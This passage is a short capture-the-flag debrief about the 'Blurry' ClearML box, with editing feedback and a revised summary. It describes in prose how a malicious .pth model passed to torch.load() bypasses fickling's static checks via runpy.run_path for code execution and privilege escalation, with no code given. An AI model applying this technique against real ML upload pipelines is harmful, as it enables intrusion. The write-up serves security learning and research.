upload, and share Machine learning models. A foothold was obtained by exploiting an insecure deserialization vulnerability in an automated review agent that uses `torch.load()` on user-submitted `.pth` files; a malicious model bypasses fickling’s static analysis by using `runpy.run_path` to execute code from an external payload file, granting initial access.
The Privilege escalation involved identifying and abusing flaws in the two scripts responsible
for security scanning of uploaded models—one a shell script that invokes fickling and the other a Python script handling additional checks. The key lesson is that static analysis of pickle-based serialization offers limited protection when deserialization can load and execute attacker-controlled code from outside the serialized object itself.

---

### Correction

That's a strong paragraph. The last sentence is the best one — that's the thesis statement for the BSides research angle.

Two small corrections:

**Sentence 2 — slight inaccuracy.** "background cleanup script" was written. It's not a cleanup script — it's a review agent. The cleanup function exists inside it, but the vulnerability is in the review/artifact processing loop. "background cleanup script" is to be changed to "automated review agent."

**Sentence 3 — oversimplified.** Two scripts handling security
scanning were described, but the actual flow is more specific: the bash script runs fickling on
extracted pickle files, and if it passes, calls the Python script which loads
the original `.pth` directly via `torch.load()`. The privesc isn't about flaws
in both scripts — it's about the gap between what fickling scans and what
`torch.load()` executes. That sentence is to be tightened to reflect that gap.

Those two things are to be fixed and Section 6 is done.

Then the debrief is complete. After that — the project context summary is to be updated and the week planned.

### Updated

1. Blurry is a vulnerable ClearML instance, a platform that allows users to
upload, and share Machine learning models.

2. A foothold was obtained by exploiting an insecure deserialization vulnerability in an automated review agent that uses `torch.load()` on user-submitted `.pth` files; a malicious model bypasses fickling’s static analysis by using `runpy.run_path` to execute code from an external payload file, granting initial access.


3. The Privilege escalation involved identifying and abusing flaws in the two scripts responsible
for security scanning of uploaded models—this is a gap between what fickling scans, and what torch.load() executes.

4. The key lesson is that static analysis of pickle-based serialization offers limited protection when deserialization can load and execute attacker-controlled code from outside the serialized object itself.
